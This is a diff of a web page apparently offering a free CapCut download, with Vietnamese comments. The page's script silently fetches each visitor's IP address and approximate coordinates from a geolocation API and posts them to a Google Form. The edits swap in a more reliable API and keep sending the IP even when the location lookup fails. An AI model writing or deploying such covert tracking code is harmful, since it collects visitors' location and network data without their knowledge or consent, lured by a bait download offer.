@@ -45,14 +45,13 @@
         <button>Capcut free</button>
     </a>
 
-    <script>
 <script>
     const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSfJs2sEvay1GimaHnWYdk-HhnjuI5LcW8gzfPcehrpRvsjJgg/formResponse";
     const ENTRY_IP = "entry.1588338519";
     const ENTRY_LAT = "entry.791072472";
     const ENTRY_LNG = "entry.1393666541";
 
-    function sendToGoogleForm(ip, lat = "Từ chối/Không hỗ trợ", lng = "Từ chối/Không hỗ trợ") {
+    function sendToGoogleForm(ip, lat = "Không lấy được", lng = "Không lấy được") {
         const formData = new FormData();
         formData.append(ENTRY_IP, ip);
         formData.append(ENTRY_LAT, lat);
@@ -71,13 +70,13 @@
         let lngFormatted = "Không xác định";
 
         try {
-            // Lấy thông tin IP và vị trí ước lượng đồng thời thông qua API
-            const response = await fetch("https://ipapi.co/json/");
+            // Sử dụng GeoJS API - ổn định và không giới hạn gắt gao
+            const response = await fetch("https://get.geojs.io/v1/ip/geo.json");
             const data = await response.json();
             
             userIP = data.ip || "Không xác định";
             
-            // Thêm dấu nháy đơn ' ở đầu để ép Google Sheets hiểu đây là text
+            // GeoJS trả về kinh độ vĩ độ dưới dạng string
             if (data.latitude && data.longitude) {
                 latFormatted = "'" + data.latitude;
                 lngFormatted = "'" + data.longitude;
@@ -88,7 +87,7 @@
             
         } catch (e) {
             console.log("Lỗi lấy thông tin IP/Vị trí", e);
-            // Gửi dữ liệu mặc định nếu lỗi mạng
+            // Vẫn gửi IP nếu lỗi đoạn lấy vị trí
             sendToGoogleForm(userIP);
         }
     });
